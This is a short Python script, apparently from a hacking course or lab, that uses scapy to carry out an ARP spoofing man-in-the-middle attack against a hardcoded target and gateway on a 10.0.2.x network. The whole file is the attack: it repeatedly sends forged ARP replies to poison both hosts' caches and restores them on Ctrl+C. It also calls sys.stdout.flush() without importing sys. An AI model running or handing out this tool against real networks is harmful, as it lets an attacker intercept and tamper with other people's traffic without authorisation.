#!/usr/bin/python3

import scapy.all as scapy
import time

# to get all field 
# scapy.ls(scapy.ARP)

def getMAC(ip):
	arpRequest = scapy.ARP(pdst=ip)
	broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
	arpRequestBroadcast = broadcast/arpRequest

	answered = scapy.srp(arpRequestBroadcast, timeout=1, verbose=False)[0]
	return answered[0][1].hwsrc


def spoof(targetIP, spoofIP):
	targetMAC = getMAC(targetIP)
	# Sending responce to victim/target 
	packet = scapy.ARP(op=2, pdst=targetIP, hwdst=targetMAC, psrc=spoofIP)
	scapy.send(packet, verbose=False)


def restore(destIP, srcIP):
	destMAC = getMAC(destIP)
	srcMAC = getMAC(srcIP)
	packet = scapy.ARP(op=2, pdst=destIP, hwdst=destMAC, psrc=srcIP, hwsrc=srcMAC)
	scapy.send(packet, count=4,  verbose=False)


targetIP = "10.0.2.7"
gatewayIP = "10.0.2.1"
packetCount = 0
try:
	while True:
		spoof(targetIP, gatewayIP)
		spoof(gatewayIP, targetIP)
		packetCount += 2
		print("\r[+] Sent packets: ", packetCount, end="")
		sys.stdout.flush()
		time.sleep(5)
except KeyboardInterrupt:
	restore(targetIP, gatewayIP)
	restore(gatewayIP, targetIP)
	print("\n[+] Exiting, Ctl+c received.")